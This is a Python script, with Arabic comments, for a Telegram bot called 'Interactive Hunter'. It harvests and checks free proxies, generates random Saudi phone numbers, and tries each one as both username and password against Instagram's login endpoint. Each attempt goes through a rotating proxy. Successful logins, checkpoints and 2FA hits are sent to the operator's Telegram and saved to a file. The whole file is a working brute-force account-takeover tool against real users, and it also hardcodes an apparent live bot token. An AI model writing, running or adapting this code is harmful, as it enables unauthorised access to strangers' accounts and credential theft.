# interactive_hunter.py - v2.0 (Fully Interactive Telegram Bot)

import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import random
from datetime import datetime
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==============================================================================
# SECTION 0: CONFIGURATION
# ==============================================================================

# --- أدخل بياناتك هنا ---
TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
ADMIN_USER_ID = 1148797883  # البوت سيستجيب فقط لأوامرك

# --- إعدادات الصيد ---
COUNTRY_CODE = "966"
OPERATOR_CODES = ["50", "55", "53", "54", "56", "58", "59"]
NUMBER_LENGTH = 7
MAX_HUNTING_THREADS = 30
HITS_FILE = "hits.txt"

# --- متغيرات عامة للتحكم في الحالة ---
is_hunting = False
hunt_task = None

# ==============================================================================
# SECTION 1: CORE LOGIC (Harvester & Instagram Hunter)
# ==============================================================================

# تم دمج كل المنطق في دالة واحدة كبيرة تعمل في الخلفية
async def the_hunt(context: ContextTypes.DEFAULT_TYPE):
    global is_hunting
    is_hunting = True
    
    # --- الجزء الأول: جامع البروكسيات ---
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="🔎 **Phase 1: Proxy Harvesting**\nStarting to scrape and check proxies...")
    
    # (هنا كود جامع البروكسيات)
    proxies_to_check_queue = queue.Queue()
    live_proxies_list = []
    try:
        response = await asyncio.to_thread(requests.get, "https://free-proxy-list.net/", timeout=15)
        soup = BeautifulSoup(response.content, 'html.parser')
        proxy_table = soup.find("table", class_="table-striped")
        count = 0
        for row in proxy_table.tbody.find_all("tr"):
            ip, port, _, _, _, _, is_https, _ = [td.string for td in row.find_all("td")]
            if is_https == 'yes':
                proxies_to_check_queue.put(f"http://{ip}:{port}")
                count += 1
        
        if count == 0:
            await context.bot.send_message(chat_id=ADMIN_USER_ID, text="❌ **Error:** No HTTPS proxies found. Stopping hunt.")
            is_hunting = False
            return

        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"✅ Scraped {count} proxies. Now checking them...")

        def _check_proxy_worker():
            while not proxies_to_check_queue.empty():
                proxy = proxies_to_check_queue.get()
                try:
                    response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=7)
                    if response.status_code == 200:
                        live_proxies_list.append(proxy)
                except Exception: pass
                proxies_to_check_queue.task_done()

        threads = [threading.Thread(target=_check_proxy_worker) for _ in range(100)]
        for t in threads: t.start()
        
        # إرسال تحديثات أثناء الفحص
        total_proxies = proxies_to_check_queue.qsize()
        while not proxies_to_check_queue.empty():
            await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"⏳ Checking... {proxies_to_check_queue.qsize()} proxies left. Found {len(live_proxies_list)} live ones so far.")
            await asyncio.sleep(15) # تحديث كل 15 ثانية
        
        for t in threads: t.join()

    except Exception as e:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"❌ **Error during harvesting:** {e}\nStopping hunt.")
        is_hunting = False
        return

    if not live_proxies_list:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text="❌ **Error:** No live proxies found after checking. Stopping hunt.")
        is_hunting = False
        return
        
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"✅ **Harvesting Complete!**\nFound {len(live_proxies_list)} live proxies.")

    # --- الجزء الثاني: صياد انستغرام ---
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="🎯 **Phase 2: The Hunt**\nGenerating targets and starting attempts...")
    
    # (هنا كود توليد الأرقام والصيد)
    targets = []
    for op_code in OPERATOR_CODES:
        for _ in range(200):
            targets.append(f"{COUNTRY_CODE}{op_code}{''.join(random.choice('0123456789') for _ in range(NUMBER_LENGTH))}")
    random.shuffle(targets)
    
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🔥 Generated {len(targets)} targets. The hunt begins now!")

    processed_targets = 0
    for target_number in targets:
        if not is_hunting: # تحقق مما إذا كان المستخدم قد أرسل أمر /stophunt
            await context.bot.send_message(chat_id=ADMIN_USER_ID, text="🛑 **Hunt Stopped by User.**")
            return

        username = password = target_number
        proxy = random.choice(live_proxies_list)
        
        # (هنا كود محاولة تسجيل الدخول)
        try:
            status = await asyncio.to_thread(attempt_login, username, password, proxy)
            if status != "FAIL":
                result_message = f"🎯 *HIT FOUND!* 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
                await context.bot.send_message(chat_id=ADMIN_USER_ID, text=result_message, parse_mode='Markdown')
                with open(HITS_FILE, "a") as f:
                    f.write(f"{username}:{password} | Status: {status}\n")
        except Exception:
            pass # تجاهل الأخطاء الفردية والمتابعة

        processed_targets += 1
        if processed_targets % 50 == 0: # إرسال تحديث كل 50 محاولة
            await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"📈 **Progress:** {processed_targets}/{len(targets)} attempts completed.")

    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="✅ **Hunt Finished!**\nAll targets have been attempted.")
    is_hunting = False

def attempt_login(username, password, proxy):
    # هذا الجزء لم يتغير، يبقى كما هو
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/accounts/login/"}
    proxies_dict = {"http": proxy, "https": proxy}
    with requests.Session() as s:
        r = s.get("https://www.instagram.com/accounts/login/", proxies=proxies_dict, timeout=10)
        csrf = r.cookies.get('csrftoken')
        if not csrf: return "FAIL"
        headers['x-csrftoken'] = csrf
        payload = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}'}
        login_r = s.post(login_url, data=payload, headers=headers, proxies=proxies_dict, timeout=10)
        if login_r.status_code != 200: return "FAIL"
        data = login_r.json()
        if data.get("authenticated"): return "SUCCESS"
        if "checkpoint_url" in login_r.text: return "CHECKPOINT"
        if data.get("two_factor_required"): return "2FA"
        return "FAIL"

# ==============================================================================
# SECTION 3: TELEGRAM COMMAND HANDLERS
# ==============================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: return
    await update.message.reply_text(
        "👋 **Welcome to the Interactive Hunter Bot v2.0!**\n\n"
        "Use the following commands:\n"
        "▶️ `/hunt` - To start the full process of harvesting and hunting.\n"
        "🛑 `/stophunt` - To stop the current hunt.\n"
        "ℹ️ `/status` - To check if a hunt is currently running."
    , parse_mode='Markdown')

async def hunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_hunting, hunt_task
    if update.effective_user.id != ADMIN_USER_ID: return
    
    if is_hunting:
        await update.message.reply_text("⚠️ A hunt is already in progress. Use /stophunt to stop it first.")
        return
    
    await update.message.reply_text("🚀 **Command received!** Starting the hunt process now. You will receive updates here.")
    # نشغل دالة الصيد كمهمة في الخلفية
    hunt_task = asyncio.create_task(the_hunt(context))

async def stophunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_hunting, hunt_task
    if update.effective_user.id != ADMIN_USER_ID: return

    if not is_hunting:
        await update.message.reply_text("ℹ️ No hunt is currently running.")
        return
    
    is_hunting = False
    if hunt_task:
        hunt_task.cancel() # نحاول إلغاء المهمة
    await update.message.reply_text("⏳ **Stopping...** The current hunt will be terminated shortly.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: return
    
    if is_hunting:
        await update.message.reply_text("✅ **Status:** A hunt is currently in progress.")
    else:
        await update.message.reply_text("🅾️ **Status:** The bot is idle. Use /hunt to start.")

# ==============================================================================
# SECTION 4: MAIN APPLICATION
# ==============================================================================

def main():
    print("--- INTERACTIVE HUNTER BOT v2.0 is starting... ---")
    print("Bot is now listening for commands on Telegram.")
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # إضافة معالجات الأوامر
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("hunt", hunt_command))
    application.add_handler(CommandHandler("stophunt", stophunt_command))
    application.add_handler(CommandHandler("status", status_command))
    
    # تشغيل البوت
    application.run_polling()

if __name__ == "__main__":
    main()
